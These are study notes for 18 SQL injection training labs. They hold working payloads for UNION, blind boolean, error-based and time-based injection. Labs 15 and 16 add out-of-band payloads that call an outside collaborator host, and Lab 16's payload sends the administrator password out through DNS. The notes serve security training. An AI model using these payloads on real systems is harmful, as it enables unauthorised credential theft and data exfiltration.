# Sql Injection - Walkthroughs

```mermaid
graph TD
    Root["Sql Injection"]
    Root --> L0["Lab 01"]
    click L0 href "#lab-01"
    Root --> L1["Lab 02"]
    click L1 href "#lab-02"
    Root --> L2["Lab 03"]
    click L2 href "#lab-03"
    Root --> L3["Lab 04"]
    click L3 href "#lab-04"
    Root --> L4["Lab 05"]
    click L4 href "#lab-05"
    Root --> L5["Lab 06"]
    click L5 href "#lab-06"
    Root --> L6["Lab 07"]
    click L6 href "#lab-07"
    Root --> L7["Lab 08"]
    click L7 href "#lab-08"
    Root --> L8["Lab 09"]
    click L8 href "#lab-09"
    Root --> L9["Lab 10"]
    click L9 href "#lab-10"
    Root --> L10["Lab 11"]
    click L10 href "#lab-11"
    Root --> L11["Lab 12"]
    click L11 href "#lab-12"
    Root --> L12["Lab 13"]
    click L12 href "#lab-13"
    Root --> L13["Lab 14"]
    click L13 href "#lab-14"
    Root --> L14["Lab 15"]
    click L14 href "#lab-15"
    Root --> L15["Lab 16"]
    click L15 href "#lab-16"
    Root --> L16["Lab 17"]
    click L16 href "#lab-17"
    Root --> L17["Lab 18"]
    click L17 href "#lab-18"
```

## Lab 01

SQL injection - product category filter

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

End goal: display all products both released and unreleased.

## Analysis

SELECT * FROM products WHERE category = 'Pets' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 1 

SELECT * FROM products WHERE category = ''--' AND released = 1 

SELECT * FROM products WHERE category = ''

SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 

---

## Lab 02

SQL injection - Login functionality

End Goal: perform SQLi attack and log in as the administrator user. 

Analysis
--------

SELECT firstname FROM users where username='admin' and password='admin'

SELECT firstname FROM users where username=''' and password='admin'

SELECT firstname FROM users where username='administrator'--' and password='admin'

SELECT firstname FROM users where username='admin'

script.py <url> <sql-payload> 

---

## Lab 03

SQLi - Product category filter

End Goal: determine the number of columns returned by the query. 

Background (Union):

table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5

Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Rule: 
- The number and the order of the columns must be the same in all queries
- The data types must be compatible

SQLi attack (way #1):

select ? from table1 UNION select NULL
-error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQLi attack (way #2):

select a, b from table1 order by 3

script.py <url> 

---

## Lab 04

SQLi - Product category filter

End Goal: determine the number of columns returned by the query. 

Background (Union):

table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5

Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Rule: 
- The number and the order of the columns must be the same in all queries
- The data types must be compatible

Step #1: Determine # of columns

SQLi attack (way #1):

select ? from table1 UNION select NULL, NULL
-error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQLi attack (way #2):

select a, b from table1 order by 3

Step #2: Determine the data type of the columns

select a, b, c from table1 UNION select NULL, NULL, 'a'
-> error -> column is not type text
-> no error -> column is of type text

## Analysis

' order by 1--
-> 3 columns -> 1st column is not shown on the page.

' UNION select NULL, 'KsZXy4', NULL--
-> 2nd column of type string

' UNION select 'a', NULL, NULL--'
' UNION select NULL, 'a', NULL--

---

## Lab 05

SQL Injection - Product category filter.

End Goal - Output the usernames and passwords in the users table and login as the administrator user.

## Analysis
--------

1) Determine # of columns that the vulnerable query is using
' order by 1--
' order by 2--
' order by 3-- -> internal server error

3-1 = 2

2) Determine the data type of the columns

select a, b from products where category='Gifts

' UNION select 'a', NULL--
' UNION select 'a', 'a'--
-> both columns are of data type string

' UNION select username, password from users--

administrator
tqx26ugf8jp1g30atsu9

script.py <url> 

---

## Lab 06

SQL Injection - Product category filter

End Goal: retrieve all usernames and passwords and login as the administrator user.

## Analysis
--------

(1) Find the number of columns that the vulnerable is using:
' order by 1-- -> not displayed on the page
' order by 2-- -> displayed on the page
' order by 3-- -> internal server error

3 - 1 = 2

(2) Find which columns contain text
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'-- ->**

(3) Output data from other tables

' UNION select NULL, username from users--
' UNION select NULL, password from users--

' UNION select NULL, version()--
-> PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit

' UNION select NULL, username || '*' || password from users--

carlos*hx8lpsrznosr462ydnvh
administrator*35v95vbpktdv4c2nqgak
wiener*0qc4vtnx4o08sr5nsstf

script.py <url> 

---

## Lab 07

Lab-07 - SQL injection attack, querying the database type and version on Oracle

SQL Injection - Product category filter

End Goal - display the database version string

## Analysis

(1) Determine the number of columns
' order by 3 -- -> internal server error

3 - 1 = 2

(2) Determine the data types of the columns

' UNION SELECT 'a', 'a' from DUAL-- -> Oracle database

(3) Output the version of the database

' UNION SELECT banner, NULL from v$version--

SELECT banner FROM v$version

script.py <url> 

---

## Lab 08: SQL injection attack, querying the database type and version on MySQL and Microsoft

SQL Injection - Product Category

End Goal - display the database version

## Analysis

(1) Find number of columns
' order by 3# -> internal server error

3 - 1 = 2

(2) Figure out which columns contain text 
' UNION SELECT 'a', 'a'#

(3) Output the version
' UNION SELECT @@version, NULL#
SELECT @@version 

8.0.23

script.py <url>

---

## Lab 09: SQL injection attack, listing the database contents on non-Oracle databases

End Goals:
- Determine the table that contains usernames and passwords
- Determine the relevant columns
- Output the content of the table
- Login as the administrator user

## Analysis

1. Find the number of columns
' order by 3-- -> Internal server error
3 - 1 = 2

2. Find the data type of the columns
' UNION select 'a', 'a'--
-> both columns accept type text

3. Version of the database
' UNION SELECT @@version, NULL-- -> not Microsoft
' UNION SELECT version(), NULL-- -> 200 OK
PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1)

4. Output the list of table names in the database

' UNION SELECT table_name, NULL FROM information_schema.tables--

users_xacgsm

5. Output the column names of the table

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm'--

username_pxqwui
password_bfvoxs

6. Output the usernames and passwords

' UNION select username_pxqwui, password_bfvoxs from users_xacgsm--

administrator
9g91jpytvv5c091xpjxc

script.py <url> 

---

## Lab 10: SQL injection attack, listing the database contents on Oracle

End Goals:
- Determine which table contains the usernames and passwords
- Determine the column names in table
- Output the content of the table
- Login as the administrator user 

## Analysis

1) Determine the number of columns
' order by 3-- -> internal server error

3 - 1 = 2

2) Find data type of columns
' UNION select 'a', 'a' from DUAL--
-> Oracle database
-> both columns accept type text

3) Output the list of tables in the database

' UNION SELECT table_name, NULL FROM all_tables--

USERS_JYPOMG

4) Output the column names of the users table

' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JYPOMG'-- 

USERNAME_LDANZP
PASSWORD_DYZWEQ

5) Output the list of usernames/passwords

' UNION select USERNAME_LDANZP, PASSWORD_DYZWEQ from USERS_JYPOMG--

administrator
c30j8bn7ejg50isvbiie

---

## Lab 11: Blind SQL injection with conditional responses

## Vulnerability
tracking cookie

End Goals:
1) Enumerate the password of the administrator
2) Log in as the administrator user

## Analysis

1) Confirm that the parameter is vulnerable to blind SQLi

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'

-> If this tracking id exists -> query returns value -> Welcome back message
-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'
-> TRUE -> Welcome back

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'
-> FALSE -> no Welcome back

2) Confirm that we have a users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'
-> users table exists in the database.

3) Confirm that username administrator exists users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'
-> administrator user exists

4) Enumerate the password of the administrator user

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
-> password is exactly 20 characters

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'

1 2 3 45 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
52rqbjtjpa749cy0bv6s

script.py url

---

## Lab 12: Blind SQL injection with conditional errors

## Vulnerability
tracking cookie

End Goals:
- Output the administrator password
- Login as the administrator user

## Analysis

1) Prove that parameter is vulnerable

' || (select '' from dual) || ' -> oracle database

' || (select '' from dualfiewjfow) || ' -> error

2) Confirm that the users table exists in the database

' || (select '' from users where rownum =1) || ' 
-> users table exists

3) Confirm that the administrator user exists in the users table
' || (select '' from users where username='administrator') || ' 

' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
-> Internal server error -> administrator user exists

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
-> 200 response -> user does not exist in database

4) Determine length of password

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
-> 200 response at 50 -> length of password is less than 50
-> 20 characters

5) Output the administrator password

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
-> w is not the first character of the password

wjuc497wl6szhbtf0cbf

script.py <url>

---

## Lab 13: Blind SQL Injection with time delays

## Vulnerability
tracking cookie

End Goal:
- to prove that the field is vulnerable to blind SQLi (time based)

## Analysis

select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';

' || (SELECT sleep(10))-- -x
' || (SELECT pg_sleep(10))-- 

script.py <url>

---

## Lab 14: Blind SQLi with time delays and informational retrieval

## Vulnerability
tracking cookie

End Goals:
- Exploit time-based blind SQLi to output the administrator password
- Login as the administrator user

## Analysis

1) Confirm that the parameter is vulnerable to SQLi

' || pg_sleep(10)--

2) Confirm that the users table exists in the database

' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--

' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--

3) Enumerate the password length

' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
-> length of password is 20 characters

4) Enumerate the administrator password

' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--

13ipnob7l2dkjp3drryy

---

## Lab 15: Blind SQL injection with out-of-band interaction

## Vulnerability
Tracking cookie

End Goal - Exploit SQLi and cause a DNS lookup

## Analysis

cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net

' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--

---

## Lab 16: Blind SQL injection with out of band data exfiltration

## Vulnerability
tracking cookie

End Goals:
1) Exploit SQLi to output the password of the administrator user
2) Login as the administrator user

## Analysis
akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net

' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)-- 

0fpkzao19uq428v3bbde

---

## Lab 17: SQL injection with filter bypass via XML encoding

End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.

## Analysis

1 UNION SELECT username || '~'  || password  FROM users

---

## Lab 18: Visible error-based SQL injection

End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.

## Analysis

select trackingId from trackingIdTable where trackingId='pFNjoVuG3fnTFJ3a''

SELECT * FROM tracking WHERE id = 'pFNjoVuG3fnTFJ3a'--'. Expected  char

CAST()

pFNjoVuG3fnTFJ3a' AND CAST((SELECT 1) as int)--

' AND 1=CAST((SELECT username from users LIMIT 1) as int)--

' AND 1=CAST((SELECT password from users LIMIT 1) as int)--

fc9v2vqq5gozv1cb0ibj

---

